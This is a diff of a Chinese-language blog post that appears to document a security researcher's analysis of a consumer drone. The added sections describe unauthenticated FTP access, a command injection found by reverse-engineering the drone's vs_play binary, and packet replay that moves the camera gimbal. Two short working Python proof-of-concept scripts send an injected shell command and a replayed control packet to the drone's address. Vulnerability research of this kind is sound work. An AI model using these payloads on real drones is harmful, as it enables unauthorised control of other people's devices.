@@ -44,9 +44,20 @@
 <meta property="og:image" content="http://example.com/posts/8a5081f6/4.1.5.png">
 <meta property="og:image" content="http://example.com/posts/8a5081f6/5.1.1.png">
 <meta property="og:image" content="http://example.com/posts/8a5081f6/5.1.2.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/5.1.4.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/5.1.5.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.1.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.2.png">
 <meta property="og:image" content="http://example.com/posts/8a5081f6/5.1.3.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.3.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.4.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.5.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.6.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.7.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/6.1.8.png">
+<meta property="og:image" content="http://example.com/posts/8a5081f6/7.2.1.png">
 <meta property="article:published_time" content="2022-10-15T02:24:12.525Z">
-<meta property="article:modified_time" content="2022-10-15T02:25:27.258Z">
+<meta property="article:modified_time" content="2022-10-17T08:49:28.534Z">
 <meta property="article:author" content="v5le0n9">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/posts/8a5081f6/8.1.1.jpg">
@@ -230,10 +241,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-10-15 10:24:12 / 修改时间：10:25:27" itemprop="dateCreated datePublished" datetime="2022-10-15T10:24:12+08:00">2022-10-15</time>
+              <time title="创建时间：2022-10-15 10:24:12" itemprop="dateCreated datePublished" datetime="2022-10-15T10:24:12+08:00">2022-10-15</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-10-17 16:49:28" itemprop="dateModified" datetime="2022-10-17T16:49:28+08:00">2022-10-17</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -257,14 +274,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.4k</span>
+              <span>2.6k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>2 分钟</span>
             </span>
 
         </div>
@@ -307,17 +324,42 @@
 <img src="/posts/8a5081f6/4.1.4.png" class="">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.16.10.10/goform/get_manpwd_info</span><br></pre></td></tr></table></figure>
 <img src="/posts/8a5081f6/4.1.5.png" class="">
-<h1 id="5-无人机-TCP-8888端口命令注入漏洞"><a href="#5-无人机-TCP-8888端口命令注入漏洞" class="headerlink" title="5. 无人机 TCP 8888端口命令注入漏洞"></a>5. 无人机 TCP 8888端口命令注入漏洞</h1><p>无人机开放了ftp服务，可以通过ftp传输文件。先去<code>/bin</code>目录下看有哪些命令可以被执行。</p>
+<h1 id="5-无人机-TCP-8021端口-FTP服务未授权访问漏洞"><a href="#5-无人机-TCP-8021端口-FTP服务未授权访问漏洞" class="headerlink" title="5. 无人机 TCP 8021端口 FTP服务未授权访问漏洞"></a>5. 无人机 TCP 8021端口 FTP服务未授权访问漏洞</h1><p>无人机开放了ftp服务，可以通过ftp传输文件。先去<code>/bin</code>目录下看有哪些命令可以被执行。</p>
 <p>有netstat，可以查看无人机开放了哪些端口。</p>
 <img src="/posts/8a5081f6/5.1.1.png" class="">
-<p>有ftpget和ftpput，可以用来传输文件，它的用法需要用户名和密码。</p>
+<p>有ftpget和ftpput，可以用来传输文件，ftp需要用户名和密码，否则会登录失败。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下载</span><br><span class="line">ftpget -u zyx -p 123456  192.168.1.156  hello</span><br><span class="line"></span><br><span class="line">上传</span><br><span class="line">ftpput -u zyx -p 123456  192.168.1.156  hello</span><br></pre></td></tr></table></figure>
-<p>否则会登录失败。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fh-linux# ftpput 172.16.10.21 vs_play </span><br><span class="line">ftpput: unexpected server response to PASS: 530 Login incorrect.</span><br></pre></td></tr></table></figure>
-<p>ftp的用户名和密码可在<code>/etc/vsftpd.conf</code>中找到？这是没密码的意思？</p>
+<p>ftp的用户名和密码可以通过Wireshark抓包来获取，查看App中哪里用到了ftp服务。</p>
 <img src="/posts/8a5081f6/5.1.2.png" class="">
-<p>实在不行还有tftp工具。接下来就是找哪个是无人机的程序。</p>
+<p>发现无人机的IP与端口8021，结合代码分析，这个端口很有可能是专门用来传输照片和视频的，使用ftp传输。</p>
+<img src="/posts/8a5081f6/5.1.4.png" class="">
+<p>在文件夹路径中输入：ftp://172.16.10.1:8021，无需用户密码即可登入无人机系统的某层目录(<code>/sdcard</code>)。上面的“picture”和“video”指的应该就是存放照片或视频的目录。</p>
+<img src="/posts/8a5081f6/5.1.5.png" class="">
+<h1 id="6-无人机-TCP-8888端口-命令注入漏洞"><a href="#6-无人机-TCP-8888端口-命令注入漏洞" class="headerlink" title="6. 无人机 TCP 8888端口 命令注入漏洞"></a>6. 无人机 TCP 8888端口 命令注入漏洞</h1><p>通过抓包可知无人机端口8888用于与App和遥控器进行TCP通信，8080进行UDP通信。在无人机终端中，哪个才是无人机的主要运行程序呢？</p>
+<p>查看终端目录，在千篇一律的Linux目录下发现一个特殊的目录：app。</p>
+<img src="/posts/8a5081f6/6.1.1.png" class="">
+<p>里面有非常多的配置文件和HEX文件，除此之外，还有一些可执行文件，哪个是我们想要的无人机可执行程序呢？按理说，肯定是最大的那个，要不然也装不下那么多功能。所以<code>vs_play</code>就很可疑。</p>
+<p>由于使用ftp是不可行了，但它还有个tftp工具可用，同4操作即可。</p>
+<p>载入IDA，查看有哪些导入函数可以利用，可以看到调用了一个危险函数<code>system()</code>，如果能成功利用的话就可以入侵无人机终端。</p>
+<img src="/posts/8a5081f6/6.1.2.png" class="">
+<p>目前来说只能利用收发UDP/TCP包来修改数据，在众多调用<code>system()</code>函数当中，如果刚好有利用到UDP/TCP包中数据的内容，或许就可以构造POC来入侵系统。</p>
 <img src="/posts/8a5081f6/5.1.3.png" class="">
+<p>发现这里的<code>system()</code>函数传入的是可变参数，参数是从&amp;v101[v12]内存块中复制过来的最多29个字节。</p>
+<img src="/posts/8a5081f6/6.1.3.png" class="">
+<p>继续往上看，分析分析：</p>
+<img src="/posts/8a5081f6/6.1.4.png" class="">
+<img src="/posts/8a5081f6/6.1.5.png" class="">
+<img src="/posts/8a5081f6/6.1.6.png" class="">
+<img src="/posts/8a5081f6/6.1.7.png" class="">
+<p>所以就可以构造发包，间接对终端执行命令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;da;&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;echo 123 &gt; /tmp/1.txt;&#x27;</span></span><br><span class="line">payload += cmd</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;172.16.10.1&#x27;</span>,<span class="number">8888</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+<img src="/posts/8a5081f6/6.1.8.png" class="">
+<h1 id="7-无人机-TCP-8888端口-UDP-8080端口-重放漏洞"><a href="#7-无人机-TCP-8888端口-UDP-8080端口-重放漏洞" class="headerlink" title="7. 无人机 TCP 8888端口 / UDP 8080端口 重放漏洞"></a>7. 无人机 TCP 8888端口 / UDP 8080端口 重放漏洞</h1><h2 id="7-1-TCP-8888端口-重放漏洞"><a href="#7-1-TCP-8888端口-重放漏洞" class="headerlink" title="7.1 TCP 8888端口 重放漏洞"></a>7.1 TCP 8888端口 重放漏洞</h2><p><a target="_blank" rel="noopener" href="https://v5le0n9.github.io/posts/ac4cb042.html#6-1-2-%E4%BA%91%E5%8F%B0%E8%A7%92%E5%BA%A6%E8%B0%83%E8%8A%82">SJ F PRO v2.4.5无人机App分析 6.1.2 云台角度调节</a></p>
+<h2 id="7-2-UDP-8080端口-重放漏洞"><a href="#7-2-UDP-8080端口-重放漏洞" class="headerlink" title="7.2 UDP 8080端口 重放漏洞"></a>7.2 UDP 8080端口 重放漏洞</h2><p>与7.1同样方法，也是可以找到一个云台角度调节的包。</p>
+<img src="/posts/8a5081f6/7.2.1.png" class="">
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;ff535410&quot;</span> + <span class="string">&quot;80&quot;</span> + <span class="string">&quot;8a&quot;</span>  <span class="comment"># 云台水平和垂直角度 </span></span><br><span class="line">payload = unhexlify(payload)</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.connect((<span class="string">&#x27;172.16.10.1&#x27;</span>, <span class="number">8080</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
+
     </div>
 
     
@@ -415,7 +457,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-telnet%E7%A9%BA%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="nav-text">1. telnet空口令漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E9%81%A5%E6%8E%A7%E5%99%A8-Web%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-text">2. 遥控器 Web管理服务弱口令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E9%81%A5%E6%8E%A7%E5%99%A8-Web%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. 遥控器 Web管理服务未授权重置密码漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E9%81%A5%E6%8E%A7%E5%99%A8-Web%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%8D%B1%E9%99%A9%E6%8E%A5%E5%8F%A3%E6%9A%B4%E9%9C%B2"><span class="nav-text">4. 遥控器 Web管理服务危险接口暴露</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E6%97%A0%E4%BA%BA%E6%9C%BA-TCP-8888%E7%AB%AF%E5%8F%A3%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">5. 无人机 TCP 8888端口命令注入漏洞</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-telnet%E7%A9%BA%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="nav-text">1. telnet空口令漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E9%81%A5%E6%8E%A7%E5%99%A8-Web%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-text">2. 遥控器 Web管理服务弱口令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E9%81%A5%E6%8E%A7%E5%99%A8-Web%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. 遥控器 Web管理服务未授权重置密码漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E9%81%A5%E6%8E%A7%E5%99%A8-Web%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%E5%8D%B1%E9%99%A9%E6%8E%A5%E5%8F%A3%E6%9A%B4%E9%9C%B2"><span class="nav-text">4. 遥控器 Web管理服务危险接口暴露</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E6%97%A0%E4%BA%BA%E6%9C%BA-TCP-8021%E7%AB%AF%E5%8F%A3-FTP%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="nav-text">5. 无人机 TCP 8021端口 FTP服务未授权访问漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-%E6%97%A0%E4%BA%BA%E6%9C%BA-TCP-8888%E7%AB%AF%E5%8F%A3-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">6. 无人机 TCP 8888端口 命令注入漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-%E6%97%A0%E4%BA%BA%E6%9C%BA-TCP-8888%E7%AB%AF%E5%8F%A3-UDP-8080%E7%AB%AF%E5%8F%A3-%E9%87%8D%E6%94%BE%E6%BC%8F%E6%B4%9E"><span class="nav-text">7. 无人机 TCP 8888端口 &#x2F; UDP 8080端口 重放漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7-1-TCP-8888%E7%AB%AF%E5%8F%A3-%E9%87%8D%E6%94%BE%E6%BC%8F%E6%B4%9E"><span class="nav-text">7.1 TCP 8888端口 重放漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-2-UDP-8080%E7%AB%AF%E5%8F%A3-%E9%87%8D%E6%94%BE%E6%BC%8F%E6%B4%9E"><span class="nav-text">7.2 UDP 8080端口 重放漏洞</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
